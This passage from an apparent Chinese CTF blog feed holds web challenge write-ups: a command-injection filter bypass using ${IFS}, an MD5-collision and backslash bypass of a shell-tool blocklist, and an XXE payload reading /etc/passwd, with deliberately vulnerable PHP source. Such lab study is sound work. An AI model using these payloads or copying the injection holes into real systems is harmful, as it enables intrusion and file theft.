<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鍘婚潪娲插惂&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123;<br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;蹇埌闈炴床浜�&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鍘婚潪娲插惂&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>有三关，首先参数<code>num</code>，经过<code>intval</code>函数，需要小于2020且值加1小于2021；对于<code>intval</code>函数，&#x3D;&#x3D;php版本在7.0以下&#x3D;&#x3D;，如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值而对于科学计数法+数字则会返回字符串类型，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230103194321462.png" alt="image-20230103194321462"></p><p>然后第二关，本身和其MD5值相同的，记住这个<code>0e215962017</code>；</p><p>第三关，首先过滤空格，然后将cat过滤，首先看一下目录下的文件，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">2</span>b1c0c38-f82e-<span class="hljs-number">41</span>c9-a0bd-<span class="hljs-number">579419</span>fc5659.node4.buuoj.cn:<span class="hljs-number">81</span>//fl4g.php?num=<span class="hljs-number">1</span>e10&amp;md5=<span class="hljs-number">0</span>e215962017&amp;get_flag=ls<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230103194512821.png" alt="image-20230103194512821"></p><p>最长的文件名应该就是了；绕过空格可以使用<code>$&#123;IFS&#125;</code>，<code>cat</code>的替代就太多了，<code>head</code>等，最后用这个，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">2</span>b1c0c38-f82e-<span class="hljs-number">41</span>c9-a0bd-<span class="hljs-number">579419</span>fc5659.node4.buuoj.cn:<span class="hljs-number">81</span>//fl4g.php?num=<span class="hljs-number">1</span>e10&amp;md5=<span class="hljs-number">0</span>e215962017&amp;get_flag=head<span class="hljs-variable">$&#123;IFS&#125;</span>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<br></code></pre></td></tr></table></figure><blockquote><p>[命令注入绕过空格_弥敦道人的博客-CSDN博客_命令注入去掉空格](<a href="https://blog.csdn.net/weixin_39219503/article/details/103948357#:~:text=%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC">https://blog.csdn.net/weixin_39219503/article/details/103948357#:~:text=命令注入绕过空格</a> 1 01 全局变量 %24 echo%24 {IFS}1234 1234,4 04 字符串处理 … 5 05 其他特殊字符绕过 )</p><p>[<a href="https://blog.csdn.net/devilare/article/details/119183057">WUSTCTF2020]朴实无华_Aurora李的博客-CSDN博客_[wustctf2020]朴实无华</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] 安洵杯2019-easyweb</title>
    <link href="/2023/01/02/%5Bctf-web%5D%20%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easyweb/"/>
    <url>/2023/01/02/%5Bctf-web%5D%20%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easyweb/</url>
    
    <content type="html"><![CDATA[<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>进入后发现URL是：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://2dc8f31f-<span class="hljs-number">7b83</span>-4ecf-a32d-15a696c255c9.node4.buuoj.cn:<span class="hljs-number">81</span>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=<br></code></pre></td></tr></table></figure><p>界面是：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230102172539960.png" alt="image-20230102172539960"></p><p>查看源码发现图片是base64格式的，URL中的这个img参数尝试解码，最后是</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">TXpVek5UTTFNbVUzTURabE5qYz0<br><span class="hljs-function"><span class="hljs-title">base64</span> --&gt;</span> MzUzNTM1MmU3MDZlNjc=<br><span class="hljs-function"><span class="hljs-title">base64</span> --&gt;</span> <span class="hljs-number">3535352</span>e706e67<br><span class="hljs-function"><span class="hljs-title">hex</span>    --&gt;</span> <span class="hljs-number">555</span>.png<br></code></pre></td></tr></table></figure><p>这样的话尝试读取index.php的内容，以同样的方式编码，</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://2dc8f31f-<span class="hljs-number">7b83</span>-4ecf-a32d-15a696c255c9.node4.buuoj.cn:<span class="hljs-number">81</span>/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=<br></code></pre></td></tr></table></figure><p>解码后得到代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class="hljs-comment">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>如果img最后的名字中有flag，那么就直接退出；主要是对cmd的过滤，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了很多的函数，然后POST的参数a和b，两者的字符不同，但是MD5要相同。</p><p>首先是执行的命令，在linux中<code>l\s</code>和<code>ls</code>是等效的，这样可以绕过过滤；</p><p>然后是MD5可以用这样的，</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br>b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><p>这两个字符串的MD5是相同的。</p><p>最后请求是：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230102173318638.png" alt="image-20230102173318638"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230102173347822.png" alt="image-20230102173347822"></p><blockquote><p>[[ctf-web] BJDCTF2020-EasyMD5 - S1n9l3 (wxyy.one)](<a href="https://wxyy.one/2022/11/29/[ctf-web]">https://wxyy.one/2022/11/29/[ctf-web]</a> BJDCTF2020-EasyMD5&#x2F;)</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>md5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] NCTF2019-FakeXMLCookbook</title>
    <link href="/2023/01/02/%5Bctf-web%5D%20NCTF2019-FakeXMLCookbook/"/>
    <url>/2023/01/02/%5Bctf-web%5D%20NCTF2019-FakeXMLCookbook/</url>
    
    <content type="html"><![CDATA[<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>进入是一个登录页面，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230102165706433.png" alt="image-20230102165706433"></p><p>查看源代码发现一段代码，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="language-javascript"> </span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">doLogin</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();</span><br><span class="language-javascript"><span class="hljs-keyword">if</span>(username == <span class="hljs-string">&quot;&quot;</span> || password == <span class="hljs-string">&quot;&quot;</span>)&#123;</span><br><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Please enter the username and password!&quot;</span>);</span><br><span class="language-javascript"><span class="hljs-keyword">return</span>;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="language-javascript">    $.<span class="hljs-title function_">ajax</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;doLogin.php&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: data,</span><br><span class="language-javascript">        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;xml&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">anysc</span>: <span class="hljs-literal">false</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">result</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> code = result.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;code&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> msg = result.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;msg&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;0&quot;</span>)&#123;</span><br><span class="language-javascript">        $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(msg + <span class="hljs-string">&quot; login fail!&quot;</span>);</span><br><span class="language-javascript">        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;1&quot;</span>)&#123;</span><br><span class="language-javascript">        $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(msg + <span class="hljs-string">&quot; login success!&quot;</span>);</span><br><span class="language-javascript">        &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-javascript">        $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(<span class="hljs-string">&quot;error:&quot;</span> + msg);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;</span><br><span class="language-javascript">            $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(errorThrown + <span class="hljs-string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;); </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>看到了xml格式，bp抓包，</p><p>发现发送的数据确实是xml格式的，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>尝试xxe，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE a[<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>读取到了文件，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230102165845708.png" alt="image-20230102165845708"></p><p>读取根目录下的flag。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[java] servlet相关</title>
    <link href="/2023/01/01/%5Bjava%5D%20servlet%E7%9B%B8%E5%85%B3/"/>
    <url>/2023/01/01/%5Bjava%5D%20servlet%E7%9B%B8%E5%85%B3/</url>
    
